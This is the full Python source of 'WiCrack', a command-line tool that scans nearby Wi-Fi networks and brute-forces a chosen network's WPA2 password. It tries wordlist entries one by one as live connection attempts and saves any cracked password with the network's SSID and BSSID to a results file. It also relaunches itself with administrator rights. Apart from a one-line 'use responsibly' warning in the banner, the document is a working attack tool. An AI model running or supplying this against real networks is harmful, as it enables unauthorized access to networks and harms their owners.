import sys
import os
import time
import platform
import ctypes
from datetime import datetime

# Check and install dependencies automatically
try:
    import pywifi
    from pywifi import const
except ImportError:
    print("Installing required packages...")
    os.system(f"{sys.executable} -m pip install --user comtypes pywifi")
    print("Please restart the script after installation completes.")
    sys.exit(1)

# Verify comtypes is available (critical for Windows)
try:
    from comtypes import GUID
except ImportError:
    print("ERROR: comtypes package not installed properly")
    print("Please run: pip install comtypes")
    sys.exit(1)

# ANSI color codes
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    PURPLE = "\033[95m"
    RESET = "\033[0m"

class WiFiCracker:
    def __init__(self):
        self.check_admin()
        self.wifi = pywifi.PyWiFi()
        self.target = None
        self.wordlist = "wordlist.txt"
        self.results_file = "wicrack_results.txt"
        self.attempts = 0
        self.start_time = None
        self.interface = self.wifi.interfaces()[0] if self.wifi.interfaces() else None
        
    def check_admin(self):
        """Verify script is running with admin privileges"""
        try:
            is_admin = os.getuid() == 0 if platform.system() != 'Windows' else ctypes.windll.shell32.IsUserAnAdmin() != 0
            if not is_admin:
                print(f"{Colors.RED}ERROR: This tool requires administrator privileges.{Colors.RESET}")
                if platform.system() == 'Windows':
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(1)
        except Exception as e:
            print(f"{Colors.RED}Admin check failed: {str(e)}{Colors.RESET}")
            sys.exit(1)

    def clear_screen(self):
        """Clear terminal screen"""
        os.system("cls" if os.name == "nt" else "clear")

    def show_banner(self):
        """Display program banner"""
        self.clear_screen()
        banner = f"""
{Colors.PURPLE}╦ ╦┬ ╔═╗┬─┐┌─┐┌─┐┬┌─
{Colors.PURPLE}║║║│-║  ├┬┘├─┤│  ├┴┐
{Colors.PURPLE}╚╩╝┴ ╚═╝┴└─┴ ┴└─┘┴ ┴
{Colors.WHITE}════════════════════════════════════════════
{Colors.BLUE}WiCrack v1.0 - Ultimate WiFi Security Tool
{Colors.BLUE}Author: Sabir
{Colors.BLUE}GitHub: https://github.com/Sabirtanvir12
{Colors.BLUE}Warning: Use responsibly and legally!
{Colors.BLUE}         DO NOT use for malicious purposes.
{Colors.YELLOW}════════════════════════════════════════════{Colors.RESET}
"""
        print(banner)
        
        if self.target:
            target_info = f"""
{Colors.CYAN}┌──────────────────────────────────────────────────────────────┐
{Colors.CYAN}│ {Colors.GREEN}Target Network: {self.target.ssid.ljust(18)}{Colors.CYAN}
{Colors.CYAN}│ {Colors.GREEN}BSSID: {self.target.bssid.ljust(27)}{Colors.CYAN}
{Colors.CYAN}│ {Colors.GREEN}Signal Strength: {str(self.target.signal).ljust(5)}% {Colors.CYAN}
{Colors.CYAN}│ {Colors.GREEN}Wordlist: {os.path.basename(self.wordlist).ljust(22)}{Colors.CYAN}
{Colors.CYAN}│ {Colors.GREEN}Interface: {self.interface.name().ljust(21)}{Colors.CYAN}
{Colors.CYAN}└──────────────────────────────────────────────────────────────┘

{Colors.YELLOW}═══════════════════════════════════════════════{Colors.RESET}
"""
            print(target_info)

    def show_homepage(self):
        """Display the main menu"""
        self.clear_screen()
        self.show_banner()
        menu = f"""
{Colors.CYAN}┌─────────────{Colors.WHITE} MAIN MENU {Colors.CYAN}─────────────┐
{Colors.CYAN}│                                          
{Colors.CYAN}│ {Colors.YELLOW}1. {Colors.WHITE}Scan WiFi Networks               {Colors.CYAN}
{Colors.CYAN}│ {Colors.YELLOW}2. {Colors.WHITE}Select Target Network            {Colors.CYAN}
{Colors.CYAN}│ {Colors.YELLOW}3. {Colors.WHITE}Set Wordlist                    {Colors.CYAN}
{Colors.CYAN}│ {Colors.YELLOW}4. {Colors.WHITE}Start Attack                    {Colors.CYAN}
{Colors.CYAN}│ {Colors.YELLOW}5. {Colors.WHITE}Show Current Configuration      {Colors.CYAN}
{Colors.CYAN}│ {Colors.YELLOW}6. {Colors.WHITE}Help                            {Colors.CYAN}
{Colors.CYAN}│ {Colors.YELLOW}7. {Colors.WHITE}Exit                            {Colors.CYAN}
{Colors.CYAN}│                                          
{Colors.CYAN}└─────────────────────────────────────┘
"""
        print(menu)

    def scan_networks(self):
        """Scan for available WiFi networks"""
        print(f"{Colors.CYAN}\n[1] Scanning for networks...{Colors.RESET}")
        
        if not self.interface:
            print(f"{Colors.RED}[-] No WiFi interface found!{Colors.RESET}")
            return False
        
        self.interface.scan()
        
        # Wait for scan to complete with progress indicator
        for i in range(1, 6):
            time.sleep(1)
            print(f"\r{Colors.YELLOW}[*] Scanning{'.'*i}{Colors.RESET}", end="")
        
        networks = self.interface.scan_results()
        if not networks:
            print(f"\n{Colors.RED}[-] No networks found!{Colors.RESET}")
            return False
        
        print(f"\n\n{Colors.GREEN}[+] Found {len(networks)} networks:{Colors.RESET}\n")
        print(f"{Colors.YELLOW}┌─────┬──────────────────────────┬──────────────────────┬────────┐")
        print(f"{Colors.YELLOW}│ {'No.'.ljust(3)} │ {'SSID'.ljust(24)} │ {'BSSID'.ljust(20)} │ {'Signal'.ljust(6)} │")
        print(f"{Colors.YELLOW}├─────┼──────────────────────────┼──────────────────────┼────────┤")
        
        for i, net in enumerate(networks, 1):
            ssid = net.ssid if net.ssid else "Hidden Network"
            print(f"{Colors.YELLOW}│ {str(i).ljust(3)} │ {Colors.WHITE}{ssid.ljust(24)}{Colors.YELLOW} │ {Colors.CYAN}{net.bssid.ljust(20)}{Colors.YELLOW} │  {Colors.GREEN}{str(net.signal).ljust(6)}{Colors.YELLOW}│")
        
        print(f"{Colors.YELLOW}└─────┴──────────────────────────┴──────────────────────┴────────┘{Colors.RESET}")
        return networks

    def select_target(self, networks):
        """Let user select target network"""
        try:
            choice = input(f"\n{Colors.YELLOW}[2] Select target (1-{len(networks)}): {Colors.RESET}")
            if choice.lower() == 'back':
                return False
            
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                self.target = networks[idx]
                print(f"{Colors.GREEN}[+] Target set: {self.target.ssid if self.target.ssid else 'Hidden Network'}{Colors.RESET}")
                return True
            
            print(f"{Colors.RED}[-] Invalid selection{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[-] Please enter a number{Colors.RESET}")
        return False

    def set_wordlist(self):
        """Configure wordlist file"""
        print(f"\n{Colors.YELLOW}[3] Current wordlist: {self.wordlist}{Colors.RESET}")
        while True:
            path = input(f"{Colors.YELLOW}[?] Enter new wordlist path (or 'back'): {Colors.RESET}").strip()
            if path.lower() == 'back':
                return
            
            if os.path.exists(path):
                self.wordlist = os.path.abspath(path)
                print(f"{Colors.GREEN}[+] Wordlist set to: {os.path.basename(self.wordlist)}{Colors.RESET}")
                return
            print(f"{Colors.RED}[-] File not found!{Colors.RESET}")

    def attack(self):
        """Execute brute-force attack"""
        if not self.target:
            print(f"{Colors.RED}\n[-] No target selected!{Colors.RESET}")
            return
        
        if not os.path.exists(self.wordlist):
            print(f"{Colors.RED}\n[-] Wordlist not found!{Colors.RESET}")
            return
        
        print(f"\n{Colors.CYAN}[4] Starting attack on {self.target.ssid if self.target.ssid else 'Hidden Network'}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Using wordlist: {os.path.basename(self.wordlist)}{Colors.RESET}")
        
        try:
            # Count lines in wordlist first
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                total = sum(1 for _ in f)
            
            if total == 0:
                print(f"{Colors.RED}[-] Wordlist is empty!{Colors.RESET}")
                return
            
            self.start_time = datetime.now()
            self.attempts = 0
            
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for i, pwd in enumerate(f, 1):
                    pwd = pwd.strip()
                    if not pwd:
                        continue
                    
                    self.attempts += 1
                    progress = f"{i}/{total} ({i/total:.1%})"
                    print(f"\r{Colors.YELLOW}[*] Trying: {pwd.ljust(20)} {progress.ljust(15)}", end="", flush=True)
                    
                    if self.try_password(pwd):
                        elapsed = datetime.now() - self.start_time
                        print(f"\n{Colors.GREEN}[+] Success! Password: {pwd}{Colors.RESET}")
                        print(f"{Colors.CYAN}[*] Found in {self.attempts} attempts ({elapsed.total_seconds():.1f}s){Colors.RESET}")
                        self.save_results(pwd)
                        return
            
            print(f"\n{Colors.RED}[-] Password not found in wordlist{Colors.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Attack interrupted{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[-] Error: {str(e)}{Colors.RESET}")

    def try_password(self, password):
        """Attempt connection with given password"""
        profile = pywifi.Profile()
        
        profile.ssid = self.target.ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        self.interface.remove_all_network_profiles()
        tmp_profile = self.interface.add_network_profile(profile)
        
        self.interface.connect(tmp_profile)
        time.sleep(2)  # Reduced connection timeout for faster testing
        
        connected = self.interface.status() == const.IFACE_CONNECTED
        self.interface.disconnect()
        return connected

    def save_results(self, password):
        """Save successful results to file"""
        with open(self.results_file, 'a') as f:
            f.write(f"\n[+] Successful Crack - {datetime.now()}\n")
            f.write(f"Network: {self.target.ssid}\n")
            f.write(f"BSSID: {self.target.bssid}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Attempts: {self.attempts}\n")
            f.write(f"Time: {(datetime.now() - self.start_time).total_seconds():.1f}s\n")
            f.write("="*50 + "\n")
        
        print(f"{Colors.GREEN}[+] Results saved to {self.results_file}{Colors.RESET}")

    def show_config(self):
        """Display current configuration"""
        print(f"\n{Colors.CYAN}[5] Current Configuration:{Colors.RESET}")
        print(f"{Colors.YELLOW}┌──────────────────────────────────────┐")
        
        if self.target:
            print(f"{Colors.YELLOW}│ {Colors.WHITE}Target Network: {self.target.ssid if self.target.ssid else 'Hidden Network'.ljust(18)}{Colors.YELLOW}")
            print(f"{Colors.YELLOW}│ {Colors.WHITE}BSSID: {self.target.bssid.ljust(27)}{Colors.YELLOW}")
            print(f"{Colors.YELLOW}│ {Colors.WHITE}Signal Strength: {str(self.target.signal).ljust(5)}% {Colors.YELLOW}")
        else:
            print(f"{Colors.YELLOW}│ {Colors.RED}No target selected!{Colors.YELLOW.ljust(30)}")
        
        print(f"{Colors.YELLOW}│ {Colors.WHITE}Wordlist: {os.path.basename(self.wordlist).ljust(22)}{Colors.YELLOW}")
        print(f"{Colors.YELLOW}│ {Colors.WHITE}Interface: {self.interface.name().ljust(21)}{Colors.YELLOW}")
        print(f"{Colors.YELLOW}└──────────────────────────────────────┘{Colors.RESET}")

    def show_help(self):
        """Display help information"""
        help_text = f"""
{Colors.CYAN}[6] WiCrack Help:{Colors.RESET}

{Colors.YELLOW}┌───────────────────────────────────────────────────────┐
{Colors.YELLOW}│ {Colors.WHITE}Command       Description                          {Colors.YELLOW}
{Colors.YELLOW}├───────────────────────────────────────────────────────┤
{Colors.YELLOW}│ {Colors.CYAN}1            {Colors.WHITE}Scan for available WiFi networks       {Colors.YELLOW}
{Colors.YELLOW}│ {Colors.CYAN}2            {Colors.WHITE}Select target network                  {Colors.YELLOW}
{Colors.YELLOW}│ {Colors.CYAN}3            {Colors.WHITE}Set wordlist file                      {Colors.YELLOW}
{Colors.YELLOW}│ {Colors.CYAN}4            {Colors.WHITE}Start brute-force attack               {Colors.YELLOW}
{Colors.YELLOW}│ {Colors.CYAN}5            {Colors.WHITE}Show current configuration             {Colors.YELLOW}
{Colors.YELLOW}│ {Colors.CYAN}6            {Colors.WHITE}Show this help menu                    {Colors.YELLOW}
{Colors.YELLOW}│ {Colors.CYAN}7            {Colors.WHITE}Exit WiCrack                          {Colors.YELLOW}
{Colors.YELLOW}│                                                   
{Colors.YELLOW}│ {Colors.WHITE}During any prompt, type 'back' to return to menu  {Colors.YELLOW}
{Colors.YELLOW}└───────────────────────────────────────────────────────┘
"""
        print(help_text)

    def run(self):
        """Main program loop"""
        while True:
            self.show_homepage()
            try:
                choice = input(f"\n{Colors.BLUE}WiCrack>{Colors.RESET} ").strip()
                
                if choice == "1":
                    networks = self.scan_networks()
                    input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.RESET}")
                elif choice == "2":
                    if not self.interface:
                        print(f"{Colors.RED}[-] No WiFi interface available!{Colors.RESET}")
                        continue
                    networks = self.scan_networks()
                    if networks:
                        self.select_target(networks)
                elif choice == "3":
                    self.set_wordlist()
                elif choice == "4":
                    self.attack()
                    input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.RESET}")
                elif choice == "5":
                    self.show_config()
                    input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.RESET}")
                elif choice == "6":
                    self.show_help()
                    input(f"\n{Colors.YELLOW}[Press Enter to continue...]{Colors.RESET}")
                elif choice == "7":
                    print(f"{Colors.GREEN}\n[+] Exiting WiCrack...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}\n[-] Invalid choice. Please select 1-7{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}[+] Exiting WiCrack...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}\n[-] Error: {str(e)}{Colors.RESET}")
                time.sleep(2)

if __name__ == "__main__":
    try:
        cracker = WiFiCracker()
        cracker.run()
    except Exception as e:
        print(f"{Colors.RED}[-] Fatal error: {str(e)}{Colors.RESET}")
        sys.exit(1)
